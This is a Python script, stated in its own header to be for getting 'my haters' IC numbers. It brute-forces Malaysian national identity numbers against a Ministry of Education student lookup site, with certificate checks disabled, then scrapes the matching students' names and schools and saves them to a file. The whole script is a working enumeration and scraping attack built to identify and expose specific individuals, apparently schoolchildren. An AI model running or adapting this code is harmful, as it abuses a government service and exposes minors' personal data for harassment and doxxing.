# Purpose : To get my haters IC numbers
# Programmer : Asuna
# Version 1.9

import os
import sys
import platform
import requests
import urllib3

from bs4 import BeautifulSoup
from urllib.request import urlopen

from _GetDetails_ import clear_screen, GetPlacesOfBirth, GetAreas, GetSchools

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_four_digits_number(i) :
    if gender in ("male", "female"):
        if gender == "male" :
            if i%2 != 0 :
                four_digits_number = (f'{i:04}')
                return four_digits_number
        elif gender == "female" :
            if i%2 == 0 :
                four_digits_number = (f'{i:04}')
                return four_digits_number
    else :
        four_digits_number = (f'{i:04}')
        return four_digits_number


def write_in_file() :
    if "Not Existing" not in response :
        with open (os.path.join(sys.path[0], 'identity_numbers.txt'), 'a', encoding='utf-8') as f:
            identity_numbers.append(response)
            f.write(response + "\n")


def get_response(school_code, birth_date, place_of_birth, four_digits_number, schools) :
    
    session = requests.Session()
    
    while four_digits_number != None :
        if school_code == None :
            response = session.get( f"https://sapsnkra.moe.gov.my/ajax/papar_carian.php?nokp={birth_date}{place_of_birth}{four_digits_number}", verify = False)
            
            if ("Tidak Wujud" not in response.text) : 
                answer = str (birth_date + place_of_birth + four_digits_number + "\tExisting!!!\t   Now going to search for his/her name and school")
                
            else : 
                answer = str (birth_date + place_of_birth + four_digits_number + "\tNot Existing")
                
            return answer
        
        elif school_code != None :
            response = session.get( f"https://sapsnkra.moe.gov.my/ajax/papar_carianpelajar.php?nokp={birth_date}{place_of_birth}{four_digits_number}&kodsek={school_code}", verify = False)
            
            if ("Tidak Wujud" not in response.text) : 
                
                name_html = session.get("https://sapsnkra.moe.gov.my/ibubapa2/semak.php", verify = False)
                
                soup = BeautifulSoup(name_html.text, 'lxml')
                name = ((soup.find(lambda t: t.text.strip()=='NAMA MURID')).find_next('td')).find_next('td')
                
                answer = str ("-"*10 + birth_date + place_of_birth + four_digits_number + "\t" + school_code + "\t   " + schools[1][schools[0].index(school_code)] + "\t   " + name.text + "-"*10)
                
            else : 
                answer = str (birth_date + place_of_birth + four_digits_number + "\t" + school_code + "\t   " + schools[1][schools[0].index(school_code)] + "\t   Not Existing")
                
            return answer
        

if __name__ == "__main__" :
    
    identity_numbers = []
    
    try :
        clear_screen()
        print ("!!!!! ALTHOUGH THE PROGRAM WILL SEARCH EVERYTHING FOR YOU, BUT IT WILL TAKE LONG TIMES DEPEND ON HOW MUCH DETAILS YOU HAD ENTERED !!!!!")
        birth_date = str (input("Please enter the birth date : (030531) "))
        user_input_place_code = str (input("Please enter the place of birth : (13)(If no just keep it blank) "))
        gender = str (input("Please enter the gender : (female)(If no just keep it blank) "))
        user_input_school_code = str (input("Please enter the school code : (YCC4102)(If no just keep it blank) ")) #YCC4102
    except Exception :
        input (Exception, "\nPress Enter to restart ...")

    
    places = GetPlacesOfBirth.get_pb() # Return ([Place Code], [Place Name])
    if user_input_place_code not in places[0] :
        
        for place_code in places[0] :
            for i in range(10000) :
                        
                four_digits_number = get_four_digits_number(i)
                response = get_response(None, birth_date, place_code, four_digits_number, None)
                
                if response == None :
                    pass
                
                else :
                    print(response)
                    write_in_file()
                    
                    if "Not Existing" not in response :
                        areas = GetAreas.get_area(place_code) # Return ([Area Code], [Area Name])
                        
                        for area_code in areas[0] :
                            schools = GetSchools.get_school(place_code, area_code) # Return ([School Code], [School Name])
                            
                            if user_input_school_code in schools[0] :
                                four_digits_number = get_four_digits_number(i)
                                response = get_response(user_input_school_code, birth_date, place_code, four_digits_number, schools)
                                
                                if response == None :
                                    pass
                                else :
                                    print(response)
                                    write_in_file()
                                    
                            else :
                                for school_code in schools[0] :
                                    for i in range(10000) :
                                        
                                        four_digits_number = get_four_digits_number(i)
                                        response = get_response(school_code, birth_date, place_code, four_digits_number, schools)
                                        
                                        if response == None :
                                            pass
                                        else :
                                            print(response)
                                            write_in_file()
                                            
                                        
    elif user_input_place_code in places[0] :
        for i in range(10000) :
            
            four_digits_number = get_four_digits_number(i)
            response = get_response(None, birth_date, user_input_place_code, four_digits_number, None)
            
            if response == None :
                    pass
                
            else :
                print(response)
                write_in_file()
                
                if "Not Existing" not in response :
                    areas = GetAreas.get_area(user_input_place_code) # Return ([Area Code], [Area Name])
                    
                    for area_code in areas[0] :
                        schools = GetSchools.get_school(user_input_place_code, area_code) # Return ([School Code], [School Name])
                        
                        if user_input_school_code in schools[0] :
                            four_digits_number = get_four_digits_number(i)
                            response = get_response(user_input_school_code, birth_date, user_input_place_code, four_digits_number, schools)
                            
                            if response == None :
                                pass
                            else :
                                print(response)
                                write_in_file()
                                
                        else :
                            for school_code in schools[0] :
                                for i in range(10000) :
                                    
                                    four_digits_number = get_four_digits_number(i)
                                    response = get_response(school_code, birth_date, user_input_place_code, four_digits_number, schools)
                                    
                                    if response == None :
                                        pass
                                    else :
                                        print(response)
                                        write_in_file()
                                        
                                        
    for existed in identity_numbers :
        print (existed)
